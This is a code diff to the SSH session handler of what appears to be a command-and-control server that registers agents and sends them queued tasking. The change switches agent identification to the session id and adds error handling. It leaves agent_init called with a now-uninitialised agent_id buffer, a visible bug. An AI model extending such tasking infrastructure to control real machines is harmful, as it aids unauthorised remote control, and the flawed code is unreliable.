@@ -793,10 +793,12 @@ void client_handler(void* sess){
     
     ssh_message message;
     int sftp = 0;
+    int rc = 0;
     int msgType = REQ_NONE;
     char buf[4096];
     char agent_id[128];
     char tmp_buffer[3];
+    char *tasking;
     memset(tmp_buffer, 0, 3);
     
     do {
@@ -853,33 +855,36 @@ void client_handler(void* sess){
     {
     case REQ_TASKING:
         ssh_channel_read(pass->chan, tmp_buffer, 2, 0);
-        ssh_channel_write(pass->chan, "ok", 2);
             
         if(tmp_buffer[0] == '0'){
+            ssh_channel_write(pass->chan, "ok", 2);
+        
             printf("Manager %s: Caught manager connection\n", pass->id);
 
             manager_handler(node);
 
         } else {
-            ssh_channel_read(pass->chan, agent_id, sizeof(agent_id), 0);
-            printf("Client %s: got identifier: %s\n", pass->id, agent_id);
-
             // Check if ID exists
             memset(buf, 0, sizeof(buf));
             strcat(buf, "agents/");
-            int exists = misc_directory_exists(strcat(buf, agent_id));
+            int exists = misc_directory_exists(strcat(buf, pass->id));
         
             if(!exists){
                 agent_init(agent_id);
                 printf("Client %s: Initialized agent\n", pass->id);
             }
 
-            char tasking[2048];
-            memset(tasking, 0, sizeof(tasking));
-            agent_get_tasking(agent_id, tasking);
+            tasking = agent_get_tasking(pass->id);
+            if(!tasking){
+                printf("Failed to open file\n");
+                perror("");
+                break;
+            }
             // Write tasking
-            ssh_channel_write(pass->chan, tasking, strlen(tasking));
-        
+            rc = ssh_channel_write(pass->chan, tasking, strlen(tasking));
+            if(rc == SSH_ERROR){
+                printf("Client %s: Failed to write to channel: %s", pass->id, ssh_get_error(ssh_channel_get_session(pass->chan)));
+            }
             // Pass to handler
             agent_handler(node);
         
